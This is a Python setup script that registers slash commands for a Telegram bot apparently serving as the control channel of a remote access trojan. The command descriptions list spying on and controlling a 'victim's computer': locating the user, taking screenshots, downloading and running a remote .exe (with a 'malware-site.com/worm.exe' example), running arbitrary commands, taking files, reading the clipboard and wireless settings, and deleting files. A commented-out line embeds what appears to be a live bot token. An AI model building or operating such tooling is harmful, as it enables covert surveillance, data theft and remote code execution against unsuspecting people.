import json, requests
# will setup bot commands so you don't have to manually do so

# enter api token here
apiToken = "API-token"


cmds = {
        "commands": [
            {
                "command": "location",
                "description": "Grabs approximate location (city, region, country, IP address, lon, & lat)"
            
            },
            
            {
                "command": "whoami",
                "description": "Grabs basic info about user"
            },

            {
                "command": "screenshot",
                "description": "Screenshots users desktop. Argument should be how many screenshots to take (EX: /screenshot 5 will take 5 consecutive screenshots"
            },

            {
                "command": "remotebinary",
                "description": "Downloads an external file & executes it. Argument should be a link to the .exe that you'd like to execute (EX: /execute https://malware-site.com/worm.exe will execute worm.exe"
            },

            {
                "command": "processes",
                "description": "Grabs a list of the running processes."
            },

            {
                "command": "delete",
                "description": "Delete a specified file. Argument should be the file location (EX: /delete USERPROFILE\\Desktop\\file.txt)"
            },

            {
                "command": "gather",
                "description": "retrieve a specified file. Argument should be the file location (EX: /retrieve USERPROFILE\\Desktop\\file.txt)"
            },

            {
                "command": "metadata",
                "description": "retrieves metadata about the specified file. Argument should be the file location you wish to retrieve metadata about (EX: /metadata USERPROFILE\\Desktop\\Files\\photo.png"
            },

            {
                "command": "ls",
                "description": "list the files in the current directory if no argument is provided. If argument is provided, list files for that directory (EX: /ls APPDATA - listing for files located in APPDATA. /ls - listing for current directory"
            },

            {
                "command": "execute",
                "description": "Execute a cmd. Arguments should be: cmd to execute and a list of arguments to pass. If no arguments, pass an empty list. EX: /cmd ls [-l,-h] or /cmd ls [] to execute ls with no arguments"
            },

            {
                "command": "power",
                "description": "shutdown, restart, or hibernate machine"
            },

            {
                "command": "playnoise",
                "description": "play sound on victim's computer"
            },

            {
                "command": "report",
                "description": "provide hardware/software report"
            },

            {
                "command": "gatherclip",
                "description": "provide data from clipboard"
            },
            
            {
                "command": "messagebox",
                "description": "open a message box with custom title and text"
            },

            {
                "command": "wreport",
                "description": "provide wireless config info"
            }
            ]
        }

r = requests.post("https://api.telegram.org/bot" + apiToken + "/setMyCommands", json=cmds)
#r = requests.post("https://api.telegram.org/bot1581260146:AAFLWEi-bu-Em4M7g93YIq131TGrT0C6cJg/setMyCommands", json=data)
print(r.status_code)
print(r.text)